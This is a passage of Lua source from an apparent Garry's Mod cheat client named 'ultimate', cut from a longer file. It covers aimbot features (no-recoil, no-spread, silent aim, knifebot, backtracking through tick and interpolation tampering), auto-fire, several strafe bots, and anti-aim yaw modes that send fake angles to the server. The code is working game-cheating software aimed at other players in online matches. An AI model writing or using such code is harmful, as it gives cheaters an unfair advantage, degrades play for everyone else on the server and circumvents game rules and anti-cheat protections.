    if not ultimate.CanShoot(cmd) then return end

    if ultimate.cfg.vars["Wait For Simulation"] then
        local simtime = ultimate.cfg.vars["dedulation"]
        if ply:GetVelocity():Length() ~= 0 then
            if simtime == 1 and not ply.simtime_updated then
                return
            elseif simtime == 2 and not me.simtime_updated and ply.simtime_updated then
                return
            end
        end
    end

    if not ultimate.cfg.vars["Aimbot smoothing"] and ultimate.SkipCommand then return end

    ultimate.aimingrn = true

    // Knife bot
    local altfire = false
    local canstab, rightstab = ultimate.CanStab( ply, bone, ply:Health() )

    
    if ultimate.cfg.vars["Knifebot"] and canstab then
        altfire = rightstab
    elseif ultimate.cfg.vars["Knifebot"] and not canstab then
        return
    end

    local oldAimAng = aimang
    local finalAngle = aimang

    if ultimate.cfg.vars["Norecoil"] then
        finalAngle = ultimate.NoRecoil(finalAngle)
    end

    if ultimate.cfg.vars["Force seed"] then
        //jopa.ForceSeed( cmd )
    end

    if ultimate.cfg.vars["Nospread"] then
        finalAngle = ultimate.NoSpread(cmd,finalAngle)
    end

    if ultimate.cfg.vars["On shot aa"] then
        finalAngle.p = -finalAngle.p - 180
        finalAngle.y = finalAngle.y + 180
    end

    if ultimate.cfg.vars["Facestab"] then
        local angles = ply:EyeAngles()

        finalAngle.y = angles.y
        finalAngle.p = angles.p

        altfire = true
    end

    if ultimate.cfg.vars["Aimbot smoothing"] then
        local va = cmd:GetViewAngles()
        va.r = 0

        local rat = ultimate.cfg.vars["Smoothing"] * 100
        local ret = LerpAngle( FrameTime()*rat, va, finalAngle )

        finalAngle = ret
    end

    if ultimate.cfg.vars["Projectile aimbot"] then
        local predTime = math.ceil( ( pLocalPlayer:EyePos() ):DistToSqr( ply:GetPos() ) / 3600 )

        //print( predTime )

        //if predTime > 15 then return end

        jopa.StartSimulation( ply:EntIndex() )

        for tick = 1, predTime do
            jopa.SimulateTick()
        end

        local data = jopa.GetSimulationData()
        local vec = data.m_vecAbsOrigin

        jopa.FinishSimulation()

        local g = predTime * 0.111

        print( vec.z, g )

        vec.z = vec.z + g

        finalAngle = ( vec - pLocalPlayer:EyePos() ):Angle()
        finalAngle:Normalize()
    end

    if ultimate.cfg.vars["Facestab"] then
        cmd:SetViewAngles( finalAngle )
        jopa.SetContextVector( cmd, oldAimAng:Forward(), true )
    elseif ultimate.cfg.vars["pSilent"] then
        jopa.SetContextVector( cmd, finalAngle:Forward(), true )
    else
        cmd:SetViewAngles( finalAngle )
    end

    if backtracking then
        targetTime = ultimate.btrecords[ply][bttick].simulationtime
        local serverArriveTick = ultimate.flServerTime + jopa.GetLatency(0) + jopa.GetLatency(1)
        local diff = serverArriveTick - targetTime


        if diff < 0.2 then
            jopa.NetSetConVar("cl_interpolate","0")
            jopa.NetSetConVar("cl_interp","0")
            jopa.SetCommandTick(cmd, ultimate.TIME_TO_TICKS(targetTime))
        else
            jopa.NetSetConVar("cl_interpolate","1")
            local interp = math.Clamp(diff, 0, 0.1)
            jopa.NetSetConVar("cl_interp", tostring(interp))
            local tick = ultimate.TIME_TO_TICKS(ultimate.flServerTime)
            jopa.SetCommandTick(cmd, tick - 1)
        end
    else
        jopa.NetSetConVarUnreliable( "cl_lagcompensation", "1" )
        jopa.NetSetConVar("cl_interpolate","0")
        jopa.NetSetConVar("cl_interp","0")
        jopa.SetCommandTick(cmd, ultimate.TIME_TO_TICKS( ent_time ) )
    end

    if ultimate.cfg.vars["Auto fire"] then
        if string.StartWith( ultimate.activeWeaponClass, "m9k_" ) then
            cmd:RemoveKey( IN_SPEED )
        end

        ultimate.SendPacket = true
        pLocalPlayer.simtime_updated = true
        jopa.UpdateClientAnimation( pLocalPlayer )

        if ultimate.cfg.vars["Resolver"] then
            ply.aimshots = (ply.aimshots or 0) + 1
        end

        local isAutomatic = true

        if ultimate.activeWeapon.Primary then
            isAutomatic = ultimate.activeWeapon.Primary.Automatic
        else
            if ultimate.activeWeaponClass == "weapon_pistol" then
                isAutomatic = false
            end
        end

        if altfire or ( ultimate.cfg.vars["Alt Rapid fire"] and cmd:CommandNumber() % 2 == 0 ) then
            cmd:AddKey(IN_ATTACK2)
        else
            if isAutomatic or ( ultimate.cfg.vars["Rapid fire"] and cmd:CommandNumber() % 2 == 0 ) then
                cmd:AddKey(IN_ATTACK)
            end
        end

        ultimate.SkipCommand = true
    end
end

function ultimate.autoReload(cmd)
    if !ultimate.cfg.vars["Auto reload"] then return end

	local wep = pLocalPlayer:GetActiveWeapon()

	if IsValid(wep) then
		if wep.Primary then
			if wep:Clip1() == 0 and wep:GetMaxClip1() > 0 and pLocalPlayer:GetAmmoCount(wep:GetPrimaryAmmoType()) > 0 then
				cmd:AddKey(IN_RELOAD)
			end
		end
	end
end

// adaptive Cstrafe

ultimate.last_ground_pos = 0
ultimate.cstrafe_dir = 0

function ultimate.PredictVelocity( velocity, viewangles, dir, maxspeed, accel )

	local forward = viewangles:Forward()
	local right = viewangles:Right()

	local fmove = 0
	local smove = ( dir == 1 ) && -10000 || 10000

	forward.z = 0
	right.z = 0

	forward:Normalize()
	right:Normalize()

	local wishdir = Vector( forward.x*fmove + right.x*smove, forward.y*fmove + right.y*smove, 0 )
	local wishspeed = wishdir:Length()

	wishdir:Normalize()

	if ( wishspeed != 0 && wishspeed > maxspeed ) then
		wishspeed = maxspeed
	end

	local wishspd = wishspeed

	if ( wishspd > 30 ) then
		wishspd = 30
	end

	local currentspeed = velocity:Dot( wishdir )
	local addspeed = wishspd - currentspeed

	if ( addspeed <= 0 ) then
		return velocity
	end

	local accelspeed = accel * wishspeed * flTickInterval

	if ( accelspeed > addspeed ) then
		accelspeed = addspeed
	end

	return velocity + ( wishdir * accelspeed )

end

function ultimate.PredictMovement( viewangles, dir, angle )

	local pm

	local sv_airaccelerate = GetConVarNumber( "sv_airaccelerate" )
	local sv_gravity = GetConVarNumber( "sv_gravity" )
	local maxspeed = pLocalPlayer:GetMaxSpeed()
	local jump_power = pLocalPlayer:GetJumpPower()

	local origin = pLocalPlayer:GetNetworkOrigin()
	local velocity = pLocalPlayer:GetAbsVelocity()

	local mins = pLocalPlayer:OBBMins()
	local maxs = pLocalPlayer:OBBMaxs()

    local pticks = math.Round(ultimate.cfg.vars["CStrafe ticks"])

	local on_ground = pLocalPlayer:IsFlagSet( FL_ONGROUND )

	for i = 1, pticks do

		viewangles.y = math.NormalizeAngle( math.deg( math.atan2( velocity.y, velocity.x ) ) + angle )

		velocity.z = velocity.z - ( sv_gravity * flTickInterval * 0.5 )

		if ( on_ground ) then

			velocity.z = jump_power
			velocity.z = velocity.z - ( sv_gravity * flTickInterval * 0.5 )

		end

		velocity = ultimate.PredictVelocity( velocity, viewangles, dir, maxspeed, sv_airaccelerate )

		local endpos = origin + ( velocity * flTickInterval )

		pm = TraceHull( {
			start = origin,
			endpos = endpos,
			filter = pLocalPlayer,
			maxs = maxs,
			mins = mins,
			mask = MASK_PLAYERSOLID
		} )

		if ( ( pm.Fraction != 1 && pm.HitNormal.z <= 0.9 ) || pm.AllSolid || pm.StartSolid ) then
			return false
		end

		if ( pm.Fraction != 1 ) then

			local time_left = flTickInterval

			for j = 1, 2 do

				time_left = time_left - ( time_left * pm.Fraction )

				local dot = velocity:Dot( pm.HitNormal )

				velocity = velocity - ( pm.HitNormal * dot )

				dot = velocity:Dot( pm.HitNormal )

				if ( dot < 0 ) then
					velocity = velocity - ( pm.HitNormal * dot )
				end

				endpos = pm.HitPos + ( velocity * time_left )

				pm = TraceHull( {
					start = pm.HitPos,
					endpos = endpos,
					filter = pLocalPlayer,
					maxs = maxs,
					mins = mins,
					mask = MASK_PLAYERSOLID
				} )

				if ( pm.Fraction == 1 || pm.AllSolid || pm.StartSolid ) then
					break
				end

			end

		end

		origin = pm.HitPos

		if ( ( ultimate.last_ground_pos - origin.z ) > math.Round(ultimate.cfg.vars["CStrafe ground diff"]) ) then
			return false
		end

		pm = TraceHull( {
			start =  Vector( origin.x, origin.y, origin.z + 2 ),
			endpos = Vector( origin.x, origin.y, origin.z - 1 ),
			filter = pLocalPlayer,
			maxs = Vector( maxs.x, maxs.y, maxs.z * 0.5 ),
			mins = mins,
			mask = MASK_PLAYERSOLID
		} )

		on_ground = ( ( pm.Fraction < 1 || pm.AllSolid || pm.StartSolid ) && pm.HitNormal.z >= 0.7 )

		velocity.z = velocity.z - ( sv_gravity * flTickInterval * 0.5 )

		if ( on_ground ) then
			velocity.z = 0
		end


	end

	return true

end

function ultimate.CircleStrafe( cmd )

	local angle = 0
	
	while ( ultimate.cstrafe_dir < 2 ) do
	
		angle = 0
		local path_found = false
		local step = ( ultimate.cstrafe_dir == 1 ) && math.Round(ultimate.cfg.vars["CStrafe angle step"]) || -math.Round(ultimate.cfg.vars["CStrafe angle step"])
		
		while ( true ) do
		
			if ( ultimate.cstrafe_dir == 1 ) then
			
				if ( angle > math.Round(ultimate.cfg.vars["CStrafe angle max step"]) ) then
					break
				end
			
			else
			
				if ( angle < -math.Round(ultimate.cfg.vars["CStrafe angle max step"]) ) then
					break
				end
			
			end

			if ( ultimate.PredictMovement( cmd:GetViewAngles(), ultimate.cstrafe_dir, angle ) ) then
			
				path_found = true
				break
			
			end

			angle = angle + step
		
		end
		
		if ( path_found ) then
			break
		end
		
		ultimate.cstrafe_dir = ultimate.cstrafe_dir + 1
	
	end
	
	if ( ultimate.cstrafe_dir < 2 ) then
	
		local velocity = pLocalPlayer:GetAbsVelocity()
		local viewangles = cmd:GetViewAngles()
		
		viewangles.y = math.NormalizeAngle( math.deg( math.atan2( velocity.y, velocity.x ) ) + angle )
		
		cmd:SetViewAngles( viewangles )
		cmd:SetSideMove( ( ultimate.cstrafe_dir == 1 ) && -10000 || 10000 )
	
	else
	
		ultimate.cstrafe_dir = 0
	
	end

end


ultimate.bhop_ai_dir = 1
ultimate.last_bhop_switch = 0
ultimate.bhop_ai_target_yaw = 0
ultimate.cstrafe_predict_ticks = 64
ultimate.cstrafe_angle_step = 1
ultimate.cstrafe_angle_maxstep = 15

function ultimate.PredictVelocityBhop( velocity, viewangles, dir, maxspeed, accel, friction, interval_per_tick )

	local forward = viewangles:Forward()
	local right = viewangles:Right()

	local fmove = 0
	local smove = ( dir == 1 ) and -10000 or 10000
 
	forward.z = 0
	right.z = 0
 
	forward:Normalize()
	right:Normalize()
 
	local wishdir = Vector( forward.x*fmove + right.x*smove, forward.y*fmove + right.y*smove, 0 )
	local wishspeed = wishdir:Length()
 
	wishdir:Normalize()
 
	if ( wishspeed != 0 and wishspeed > maxspeed ) then
		wishspeed = maxspeed
	end
 
	local wishspd = wishspeed
 
	if ( wishspd > 30 ) then
		wishspd = 30
	end
 
	local currentspeed = velocity:Dot( wishdir )
	local addspeed = wishspd - currentspeed
 
	if ( addspeed <= 0 ) then
		return
	end
 
	local accelspeed = accel * interval_per_tick * wishspeed * friction
 
	if ( accelspeed > addspeed ) then
		accelspeed = addspeed
	end
 
	local new_vel = wishdir * accelspeed
 
	velocity:Add( new_vel )

end

function ultimate.PredictMovementBhop( viewangles, dir, angle, collect, fast_check )
 
	local pm
 
	local maxspeed = pLocalPlayer:GetMaxSpeed()
	local jump_power = pLocalPlayer:GetJumpPower()
	local interval_per_tick = TickInterval
	local gravity_per_tick = GetConVarNumber( "sv_gravity" ) * interval_per_tick
	local accel = GetConVarNumber( "sv_airaccelerate" )
	local stick_to_ground = GetConVarNumber( "sv_sticktoground" ) == 1
	local friction = pLocalPlayer:GetInternalVariable( "m_surfaceFriction" ) or 1
	local origin = pLocalPlayer:GetNetworkOrigin()
	local velocity = pLocalPlayer:GetAbsVelocity()
	local mins = pLocalPlayer:OBBMins()
	local maxs = pLocalPlayer:OBBMaxs()
	local on_ground = pLocalPlayer:IsFlagSet( FL_ONGROUND )
 
	local start_origin = origin
	local total_dist = 0
	local total_fraction = 0
	local min_fraction = 1

	local ticks = fast_check and 15 or ultimate.cstrafe_predict_ticks

	for i = 1, ticks do
 
		viewangles.y = math_NormalizeAngle( math_deg( math_atan2( velocity.y, velocity.x ) ) + angle )
 
		velocity.z = velocity.z - ( gravity_per_tick * 0.5 )
 
		if ( on_ground ) then
 
			velocity.z = velocity.z + jump_power
			velocity.z = velocity.z - ( gravity_per_tick * 0.5 )
 
		end
 
		ultimate.PredictVelocityBhop( velocity, viewangles, dir, maxspeed, accel, friction, interval_per_tick )
 
		local endpos = origin + ( velocity * interval_per_tick )
 
		pm = TraceHull( {
			start = origin,
			endpos = endpos,
			filter = pLocalPlayer,
			maxs = maxs,
			mins = mins,
			mask = MASK_PLAYERSOLID
		} )
 
		total_fraction = total_fraction + pm.Fraction
		if pm.Fraction < min_fraction then min_fraction = pm.Fraction end

		if ( ( pm.Fraction != 1 && pm.HitNormal.z <= 0.9 ) || pm.AllSolid || pm.StartSolid ) then
			return false, 0
		end
 
		if ( pm.Fraction != 1 ) then
 
			local time_left = interval_per_tick
 
			for j = 1, 2 do
 
				time_left = time_left - ( time_left * pm.Fraction )
 
				local dot = velocity:Dot( pm.HitNormal )
 
				velocity = velocity - ( pm.HitNormal * dot )
 
				dot = velocity:Dot( pm.HitNormal )
 
				if ( dot < 0 ) then
					velocity = velocity - ( pm.HitNormal * dot )
				end
 
				endpos = pm.HitPos + ( velocity * time_left )
 
				pm = TraceHull( {
					start = pm.HitPos,
					endpos = endpos,
					filter = pLocalPlayer,
					maxs = maxs,
					mins = mins,
					mask = MASK_PLAYERSOLID
				} )
 
				if ( ( pm.Fraction != 1 && pm.HitNormal.z <= 0.9 ) || pm.AllSolid || pm.StartSolid ) then
					return false, 0
				end
 
				if ( pm.Fraction == 1 ) then
					break
				end
 
			end
 
		end
 
		origin = pm.HitPos
		total_dist = total_dist + ( origin - pm.StartPos ):Length2D()
 
		friction = 1
 
		if ( velocity.z > 140 && !stick_to_ground ) then
 
			on_ground = false
 
		else
 
			pm = TraceHull( {
				start =  Vector( origin.x, origin.y, origin.z + 2 ),
				endpos = Vector( origin.x, origin.y, origin.z - 1 ),
				filter = pLocalPlayer,
				maxs = Vector( maxs.x, maxs.y, maxs.z * 0.5 ),
				mins = mins,
				mask = MASK_PLAYERSOLID
			} )
 
			on_ground = ( ( pm.Fraction < 1 || pm.AllSolid || pm.StartSolid ) && pm.HitNormal.z >= 0.7 )
 
			if ( !on_ground && velocity.z > 0 ) then
 
				friction = 0.25
 
			end
 
		end
 
		velocity.z = velocity.z - ( gravity_per_tick * 0.5 )
 
		if ( on_ground ) then
			velocity.z = 0
		end
 
	end
 
	local straight_dist = ( origin - start_origin ):Length2D()
	local dist_efficiency = straight_dist / ( total_dist + 0.001 )
	
	local score = ( total_fraction / ticks ) * 100 * math_Clamp( dist_efficiency, 0.1, 1 )
	
	local forward_check = TraceHull({
		start = origin,
		endpos = origin + velocity:GetNormalized() * 50,
		mins = mins,
		maxs = maxs,
		filter = pLocalPlayer,
		mask = MASK_PLAYERSOLID
	})
	
	if forward_check.Fraction < 1 then
		score = score * forward_check.Fraction
	end

	return true, score
 
end

function ultimate.CStrafe( UserCMD )

	if ( !IsValid( pLocalPlayer ) ) then return end
	if pLocalPlayer:WaterLevel() >= 2 or pLocalPlayer:GetMoveType() == MOVETYPE_LADDER then return end

	local velocity = pLocalPlayer:GetAbsVelocity()
	local speed = velocity:Length2D()
	
	local vel_yaw = math_deg( math_atan2( velocity.y, velocity.x ) )
	local look_yaw = UserCMD:GetViewAngles().y

	local left_dist = 0
	local right_dist = 0
	local scan_rays = 8
	local scan_angle = 120

	local base_yaw = ( speed < 150 ) and look_yaw or vel_yaw
	if speed >= 150 and speed < 300 then
		local frac = ( speed - 150 ) / 150
		base_yaw = math_NormalizeAngle( look_yaw + math_NormalizeAngle( vel_yaw - look_yaw ) * frac )
	end

	for i = 1, scan_rays do
		local ang = base_yaw + ( ( i / scan_rays ) * scan_angle )
		local tr = TraceHull({
			start = pLocalPlayer:GetNetworkOrigin() + Vector(0, 0, 35),
			endpos = pLocalPlayer:GetNetworkOrigin() + Vector(0, 0, 35) + Angle(0, ang, 0):Forward() * 250,
			mins = Vector(-16, -16, -16),
			maxs = Vector(16, 16, 16),
			filter = pLocalPlayer,
			mask = MASK_PLAYERSOLID
		})
		local weight = 1.5 - ( ( i - 1 ) / scan_rays )
		left_dist = left_dist + ( tr.Fraction * weight )
	end

	for i = 1, scan_rays do
		local ang = base_yaw - ( ( i / scan_rays ) * scan_angle )
		local tr = TraceHull({
			start = pLocalPlayer:GetNetworkOrigin() + Vector(0, 0, 35),
			endpos = pLocalPlayer:GetNetworkOrigin() + Vector(0, 0, 35) + Angle(0, ang, 0):Forward() * 250,
			mins = Vector(-16, -16, -16),
			maxs = Vector(16, 16, 16),
			filter = pLocalPlayer,
			mask = MASK_PLAYERSOLID
		})
		local weight = 1.5 - ( ( i - 1 ) / scan_rays )
		right_dist = right_dist + ( tr.Fraction * weight )
	end

	local switch_threshold = math_Clamp( 0.3 + ( speed / 2000 ), 0.3, 0.8 )
	
	local hysteresis_time = ( speed < 300 ) and 0.2 or 0.4
	if ( CurTime() - ( ultimate.last_bhop_switch or 0 ) ) > hysteresis_time then
		if left_dist > right_dist + switch_threshold then
			ultimate.bhop_ai_dir = 1
			ultimate.last_bhop_switch = CurTime()
		elseif right_dist > left_dist + switch_threshold then
			ultimate.bhop_ai_dir = 0
			ultimate.last_bhop_switch = CurTime()
		end
	end

	local best_angle = 0
	local best_path_score = -1
	
	local directions = { ultimate.bhop_ai_dir, ( ultimate.bhop_ai_dir == 1 ) and 0 or 1 }
	
	local search_stages = { 
		{ max = ultimate.cstrafe_angle_maxstep, step = ultimate.cstrafe_angle_step },
		{ max = 45, step = 2 }
	}

	for _, stage in ipairs( search_stages ) do
		for _, dir in ipairs( directions ) do
			local current_angle = 0
			local step = ( dir == 1 ) and stage.step or -stage.step
			local max_angle = stage.max

			while ( math_abs( current_angle ) <= max_angle ) do
				local success, score = ultimate.PredictMovementBhop( UserCMD:GetViewAngles(), dir, current_angle, false, true )
				if ( success ) then
					local combined_score = score - math_abs( current_angle ) * 1.5
					
					if combined_score > best_path_score then
						best_angle = current_angle
						best_path_score = combined_score
						ultimate.bhop_ai_dir = dir
					end
					
					if combined_score > 90 then break end
				end

				current_angle = current_angle + step
			end
			
			if ( best_path_score > 85 ) then break end
		end
		
		if ( best_path_score > 0 ) then break end
	end

	if best_path_score <= 0 then
		best_angle = ( ultimate.bhop_ai_dir == 1 ) and 30 or -30
	end

	local target_yaw = math_NormalizeAngle( ( speed < 100 and look_yaw or vel_yaw ) + best_angle )

	UserCMD:SetForwardMove( 0 )
	UserCMD:SetSideMove( ( ultimate.bhop_ai_dir == 1 ) and -10000 or 10000 )
	
	ultimate.bhop_ai_target_yaw = target_yaw
	
	return target_yaw
end


function ultimate.DrawCStrafePath()
	if not ultimate.cfg.vars["Adaptive CStrafe Path"] then return end
	
	local CStrafeActive = ultimate.IsKeyDown(ultimate.cfg.binds["Adaptive CStrafe"]) and ultimate.cfg.vars["Adaptive CStrafe"]
	if not CStrafeActive then return end
	
	if not IsValid(pLocalPlayer) or not pLocalPlayer:Alive() then return end
	
	local velocity = pLocalPlayer:GetAbsVelocity()
	local speed = velocity:Length2D()
	if speed < 10 then return end
	

	local origin = pLocalPlayer:GetPos()
	local vel = Vector(velocity.x, velocity.y, velocity.z)
	local maxspeed = pLocalPlayer:GetMaxSpeed()
	local accel = GetConVarNumber("sv_airaccelerate")
	local interval = TickInterval
	local friction = pLocalPlayer:GetInternalVariable("m_surfaceFriction") or 1
	
	local curvePoints = {}
	local numTicks = 20
	

	local groundTrace = TraceLine({
		start = origin,
		endpos = origin - Vector(0, 0, 100),
		filter = pLocalPlayer,
		mask = MASK_PLAYERSOLID
	})
	
	table_insert(curvePoints, groundTrace.HitPos + Vector(0, 0, 2))
	

	for i = 1, numTicks do

		local vel_yaw = math_deg(math_atan2(vel.y, vel.x))
		

		local sidemove = (ultimate.bhop_ai_dir == 1) and -10000 or 10000
		

		local viewangles = Angle(0, vel_yaw, 0)
		local right = viewangles:Right()
		
		right.z = 0
		right:Normalize()
		

		local wishdir = Vector(right.x * sidemove, right.y * sidemove, 0)
		local wishspeed = wishdir:Length()
		wishdir:Normalize()
		
		if wishspeed > maxspeed then wishspeed = maxspeed end
		
		local wishspd = wishspeed
		if wishspd > 30 then wishspd = 30 end
		

		local currentspeed = vel:Dot(wishdir)
		local addspeed = wishspd - currentspeed
		
		if addspeed > 0 then
			local accelspeed = accel * interval * wishspeed * friction
			if accelspeed > addspeed then accelspeed = addspeed end
			
			vel.x = vel.x + wishdir.x * accelspeed
			vel.y = vel.y + wishdir.y * accelspeed
		end
		

		origin = origin + vel * interval
		

		local trace = TraceLine({
			start = origin + Vector(0, 0, 50),
			endpos = origin - Vector(0, 0, 150),
			filter = pLocalPlayer,
			mask = MASK_PLAYERSOLID
		})
		
		table_insert(curvePoints, trace.HitPos + Vector(0, 0, 2))
	end
	
	if #curvePoints < 2 then return end
	

	render_SetMaterial(ultimate.Materials["Gradient"])
	
	local count = #curvePoints
	local time = CurTime()
	

	local pathColor = string.ToColor(ultimate.cfg.colors["Adaptive CStrafe Path"])
	local r = pathColor.r
	local g = pathColor.g
	local b = pathColor.b
	local a = pathColor.a
	
	for i = 1, count - 1 do
		local startPos = curvePoints[i]
		local endPos = curvePoints[i + 1]
		

		local progress = (count - i) / count
		

		local pulse = math_sin(time * 5 - i * 0.15) * 0.1 + 1
		

		local midThickness = math_max(0.3, 2.5 * progress)
		render_DrawBeam(startPos, endPos, midThickness, 0, 1, Color(r, g, b, (a * 0.7) * progress))
		

		local coreThickness = math_max(0.2, 1.0 * progress)
		render_DrawBeam(startPos, endPos, coreThickness, 0, 1, Color(r, g, b, a * progress))
	end
end

do
    local ztick = 0
    local prev_yaw = 0
    local old_yaw = 0.0

    function ultimate.AutoStrafe( cmd )
        ztick = ztick + 1

        if ( ultimate.IsKeyDown(ultimate.cfg.binds["Circle strafe"]) and ultimate.cfg.vars["Circle strafe"] ) then
        
            ultimate.CircleStrafe( cmd )
    
        elseif ( ultimate.IsKeyDown(ultimate.cfg.binds["Adaptive CStrafe"]) and ultimate.cfg.vars["Adaptive CStrafe"] ) then
        
            local target_yaw = ultimate.CStrafe( cmd )
            if target_yaw then
                ultimate.MovementFix( cmd, target_yaw )
            end
    
        elseif ( ultimate.IsKeyDown(ultimate.cfg.binds["Z Hop"]) and ultimate.cfg.vars["Z Hop"] ) then
            local handler = ztick / 3.14
            
            cmd:SetSideMove( 5000 * math.sin(handler) )
        elseif ultimate.cfg.vars["Air strafer"] and ultimate.cfg.vars["Strafe mode"] == 3 then
    
            local get_velocity_degree = function(velocity)
                local tmp = math.deg(math.atan(30.0 / velocity))
                    
                if (tmp > 90.0) then
                    return 90.0
                elseif (tmp < 0.0) then
                    return 0.0
                else
                    return tmp
                end
            end
    
            local M_RADPI = 57.295779513082
            local side_speed = 10000
            local velocity = pLocalPlayer:GetVelocity()
            velocity.z = 0.0
    
            local forwardmove = cmd:GetForwardMove()
            local sidemove = cmd:GetSideMove()
    
            if (!forwardmove || !sidemove) then
                return
            end
    
            if(velocity:Length2D() <= 15.0 && !(forwardmove != 0 || sidemove != 0)) then
                return
            end
    
            local flip = cmd:TickCount() % 2 == 0
    
            local turn_direction_modifier = flip && 1.0 || -1.0
            local viewangles = Angle(ultimate.SilentAngle.x, ultimate.SilentAngle.y, ultimate.SilentAngle.z)
    
            if (forwardmove || sidemove) then
                cmd:SetForwardMove(0)
                cmd:SetSideMove(0)
    
                local turn_angle = math.atan2(-sidemove, forwardmove)
                viewangles.y = viewangles.y + (turn_angle * M_RADPI)
            elseif (forwardmove) then
                cmd:SetForwardMove(0)
            end
    
            local strafe_angle = math.deg(math.atan(15 / velocity:Length2D()))
    
            if (strafe_angle > 90) then
                strafe_angle = 90
            elseif (strafe_angle < 0) then
                strafe_angle = 0
            end
    
            local temp = Vector(0, viewangles.y - old_yaw, 0)
            temp.y = math.NormalizeAngle(temp.y)
    
            local yaw_delta = temp.y
            old_yaw = viewangles.y
    
            local abs_yaw_delta = math.abs(yaw_delta)
    
            if (abs_yaw_delta <= strafe_angle || abs_yaw_delta >= 30) then
                local velocity_angles = velocity:Angle()
    
                temp = Vector(0, viewangles.y - velocity_angles.y, 0)
                temp.y = math.NormalizeAngle(temp.y)
    
                local velocityangle_yawdelta = temp.y
                local velocity_degree = get_velocity_degree(velocity:Length2D() * 128)
    
                if (velocityangle_yawdelta <= velocity_degree || velocity:Length2D() <= 15) then
                    if (-velocity_degree <= velocityangle_yawdelta || velocity:Length2D() <= 15) then
                        viewangles.y = viewangles.y + (strafe_angle * turn_direction_modifier)
                        cmd:SetSideMove(side_speed * turn_direction_modifier)
                    else
                        viewangles.y = velocity_angles.y - velocity_degree
                        cmd:SetSideMove(side_speed)
                    end
                else
                    viewangles.y = velocity_angles.y + velocity_degree
                    cmd:SetSideMove(-side_speed)
                end
            elseif (yaw_delta > 0) then
                cmd:SetSideMove(-side_speed)
            elseif (yaw_delta < 0) then
                cmd:SetSideMove(side_speed)
            end
    
            local move = Vector(cmd:GetForwardMove(), cmd:GetSideMove(), 0)
            local speed = move:Length()
    
            local angles_move = move:Angle()
    
            local normalized_x = math.modf(ultimate.SilentAngle.x + 180, 360) - 180
            local normalized_y = math.modf(ultimate.SilentAngle.y + 180, 360) - 180
    
            local yaw = math.rad(normalized_y - viewangles.y + angles_move.y)
    
            if (normalized_x >= 90 || normalized_x <= -90 || ultimate.SilentAngle.x >= 90 && ultimate.SilentAngle.x <= 200 || ultimate.SilentAngle.x <= -90 && ultimate.SilentAngle.x <= 200) then
                cmd:SetForwardMove(-math.cos(yaw) * speed)
            else
                cmd:SetForwardMove(math.cos(yaw) * speed)
            end
    
            cmd:SetSideMove(math.sin(yaw) * speed)

        elseif ultimate.cfg.vars["Air strafer"] and ultimate.cfg.vars["Strafe mode"] == 2 then
            cmd:SetForwardMove(0)

            if pLocalPlayer:IsFlagSet( FL_ONGROUND ) then
                cmd:SetForwardMove(10000)
            else
                cmd:SetForwardMove(5850 / pLocalPlayer:GetVelocity():Length2D())
                cmd:SetSideMove((cmd:CommandNumber() % 2 == 0) && -400 || 400)
            end            
        end
    end
end

/*
    Anti aim

*/

ultimate.aatarget = nil

function ultimate.PredictedPos(ply, ticks)
    ticks = ticks or 1

    local dt  = engine.TickInterval() * ticks
    local pos = ply:GetNetworkOrigin()
    local vel = ply:GetAbsVelocity()

    if not ply.m_vecOldVelocity then
        return pos + vel * dt
    end

    local accel = (vel - ply.m_vecOldVelocity) / engine.TickInterval()

    if accel:LengthSqr() > 4000 * 4000 then
        return pos + vel * dt
    end

    return pos + vel * dt + accel * (0.5 * dt * dt)
end

function ultimate.PredictedEyePos()
    return pLocalPlayer:EyePos() + pLocalPlayer:GetVelocity() * flTickInterval
end

function ultimate.GetBaseYaw()
    if not IsValid( ultimate.aatarget ) or ultimate.cfg.vars["Yaw base"] != 2 then
        return ultimate.SilentAngle.y
    end

    return math.NormalizeAngle( (ultimate.PredictedPos(ultimate.aatarget) - ultimate.PredictedEyePos()):Angle().y )
end

function ultimate.Freestand(cmd)
	if !IsValid(ultimate.aatarget) then return false end

	local headpos = pLocalPlayer:GetBonePosition(pLocalPlayer:LookupBone("ValveBiped.Bip01_Head1"))
	if !headpos then return end

	local selfpos = pLocalPlayer:GetPos()
	local headoffset = Vector(selfpos.x, selfpos.y, headpos.z):Distance(headpos) + 5

	local found = true

	local pos = ultimate.aatarget:WorldToLocal(selfpos)
	local bearing = math.deg(-math.atan2(pos.y, pos.x)) + 180 + 90
	local left, right = bearing - 180 - 90, bearing - 180 + 90

	local function CheckYaw(yaw)
		yaw = math.rad(yaw)
		local x, y = math.sin(yaw), math.cos(yaw)

		local headoffsetvec = Vector(x, y, 0) * headoffset
		headoffsetvec.z = headpos.z - selfpos.z

		local tr = TraceLine({
			start = ultimate.aatarget:EyePos() + ultimate.aatarget:GetVelocity() * flTickInterval * 4,
			endpos = selfpos + headoffsetvec,
			filter = ultimate.aatarget
		})

		return tr.Fraction < 1 and tr.Entity != pLocalPlayer
	end

	local function Normalize(ang) return 360 - ang + 90 end

	local leftcheck, rightcheck = CheckYaw(left), CheckYaw(right)

	left, right = Normalize(left), Normalize(right)

	do
		local headlocal = pLocalPlayer:WorldToLocal(headpos)
		if headlocal.x > 0 then
			left, right = right, left
		end
	end

	if leftcheck and rightcheck then
		return false
	elseif leftcheck then
		return true, left , right
	elseif rightcheck then
		return true, right, left
	end

	return false
end

ultimate.realAngle = pLocalPlayer:EyeAngles()
ultimate.inverted = false
ultimate.oldYaw = 0
ultimate.SwaySide = 1

local baseyaw = 0

ultimate.CalcYaw = {
    // Backward
    [1] = function( cmd )
        return baseyaw - 178
    end,
    // Fake forward
    [2] = function( cmd )
        return ultimate.SendPacket and baseyaw or baseyaw + 178
    end,
    // Legit Delta
    [3] = function( cmd )
        return ultimate.SendPacket and baseyaw or baseyaw + ( ultimate.inverted and 43 or - 43 )
    end,
    // Sideways
    [4] = function( cmd )
        local delta = ultimate.inverted and 89 or -89
        return baseyaw - ( ultimate.SendPacket and delta or -delta )
    end,
    // Half Sideways
    [5] = function( cmd )
        local delta = ultimate.inverted and 89 or -89
        return baseyaw - ( ultimate.SendPacket and delta or 178 )
    end,
    // Fake Spin
    [6] = function( cmd )
        local add = math.NormalizeAngle( CurTime() * ultimate.cfg.vars["Spin speed"] * 10 )
        return ultimate.SendPacket and ( ultimate.inverted and ( baseyaw - 178 ) or add ) or ( ultimate.inverted and add or ( baseyaw - 178 ) )
    end,
    // Sin Sway
    [7] = function( cmd )
        local add = ultimate.cfg.vars["Sin add"]
        local sin = math.sin( CurTime() ) * ultimate.cfg.vars["Sin delta"]
        return ultimate.SendPacket and baseyaw + sin + add or baseyaw - sin - add
    end,
